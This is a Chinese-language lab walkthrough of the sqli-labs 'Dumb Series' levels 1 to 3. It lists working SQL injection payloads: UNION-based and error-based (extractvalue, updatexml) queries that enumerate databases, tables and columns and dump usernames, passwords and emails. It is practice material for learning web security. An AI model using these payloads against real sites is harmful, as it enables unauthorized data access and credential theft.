SQLI DUMB SERIES-1

输入?id=1后页面显示登录成功，用户名Dumb密码Dumb

输入?id=1’ 语法出现报错

输入?id=1’ order by 1 –+ 或?id=1’ order by 1 #就可以注释掉系统后面的代码
页面显示正常，可以判断存在单引号的注入问题。

尝试输入
?id=1’ and 1=2 order by 1 –+
?id=1’ and 1=2 order by 2 –+
?id=1’ and 1=2 order by 3 –+皆无错误，当字段到4是回显错误，说明有3个字段。

输入?id=-1’ union select 1,2,3–+查询数据库的名字
注：这里使用-1使union之前的语句查询无结果，则显示的时候就会显示union之后的第二条语句。

输入?id=-1’ and 1=2 union select 1,database(),3–+查询数据库

输入?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+

查询第三个数据库的表名

输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users” –+

查询users表内容

输入?id=-1’ union select 1,2,concat(id,0x3a,username,0x3a,password) from users –+
查询id、用户名、密码

SQLI DUMB SERIES-2

输入?id=1后页面显示登录成功，用户名Dumb密码Dumb

输入?id=1’ 出现报错

输入?id=1 and (extractvalue(‘anything’,’/x/xx’))–+
报错注入执行成功

输入?id=1 and (extractvalue(1,concat(1,(select database()))))
报出用户名信息

updatexml和extractvalue都是基于xml语法
输入?id=1 and (updatexml(1,concat(1,(select database())),1))
报出用户名信息

输入?id=1 and (updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1))
报出表名

输入?id=1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=’emails’)),1))
报出emails表中的列名

输入?id=1 and (updatexml(1,concat(0x7e,(select group_concat(id,0x3a,email_id,0x7e) from emails )),1))
报出emails表内容，由于位数限制只能报出前两个

添上查询条件where id not in(1)不看id为1的数据
输入?id=1 and (updatexml(1,concat(0x3e,(select group_concat(id,0x3a,email_id,0x7e) from emails where id not in(1) )),1))
报出id2,3的数据

SQLI DUMB SERIES-3

输入?id=1与之前出现页面一样，输入?id=1’后报错

输入?id=-1’) union select 1,2,3 –+

输入?id=-1’) union select 1,2,database(); –+

报出用户名信息

输入?id=-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ –+
查看security数据库

输入?id=-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’user’ –+
查询数据库的表

输入?id=-1’) union select 1,2,group_concat(username) from security.users –+
查询user表

输入?id=-1’) union select 1,2,group_concat(password) from security.users –+
查询密码
